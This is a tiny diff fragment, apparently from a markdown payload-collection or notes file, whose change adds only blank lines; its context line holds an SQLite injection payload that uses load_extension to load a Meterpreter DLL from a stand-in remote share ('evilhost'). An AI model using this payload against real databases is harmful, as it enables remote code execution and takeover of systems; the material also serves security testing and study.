@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:24:33.084032+00:00'
 ```sql
 UNION SELECT 1,load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');--
 ```
+
+
